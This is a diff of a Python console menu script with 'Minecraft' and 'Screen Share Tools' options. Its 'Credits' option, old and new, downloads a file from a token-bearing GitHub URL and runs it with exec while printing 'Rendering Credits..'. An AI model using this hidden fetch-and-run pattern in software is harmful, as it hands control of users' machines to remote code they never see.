@@ -55,7 +55,7 @@ nig = """
                                                 \033[1;39m└────────────────────┘                                                                            
 
 
-                                          \033[1;31m[\033[1;39m1\033[1;31m] \033[1;32mMinecraft  \033[1;31m[\033[1;39mSS\033[1;31m] \033[1;32mScreen Share Tools
+                                          \033[1;31m[\033[1;39m1\033[1;31m] \033[1;32mMinecraft  \033[1;31m[\033[1;39m2\033[1;31m] \033[1;32mScreen Share Tools
 
 
                                                      \033[1;31m[\033[1;39mC\033[1;31m] \033[1;32mCredits
@@ -80,10 +80,10 @@ while True:
     if chon == 'c':
         os.system('cls')
         print("                                                  \033[1;39mRendering Credits..")
-        exec(requests.get('https://raw.githubusercontent.com/xNorih/xNorih/main/Credits?token=GHSAT0AAAAAACVUJWYEJ46OCKL4YS7C6LP4ZVRTBFQ').text)
+        exec(requests.get('https://raw.githubusercontent.com/xNorih/FYRECHAGER-/main/Credits?token=GHSAT0AAAAAACVUJWYEXHAFRGVPH4JKAMWKZVRTIFA').text)
     if chon == 'C':
         os.system('cls')
         print("                                                  \033[1;39mRendering Credits..")
-        exec(requests.get('https://raw.githubusercontent.com/xNorih/xNorih/main/Credits?token=GHSAT0AAAAAACVUJWYEJ46OCKL4YS7C6LP4ZVRTBFQ').text)
+        exec(requests.get('https://raw.githubusercontent.com/xNorih/FYRECHAGER-/main/Credits?token=GHSAT0AAAAAACVUJWYEXHAFRGVPH4JKAMWKZVRTIFA').text)
     else:
         continue
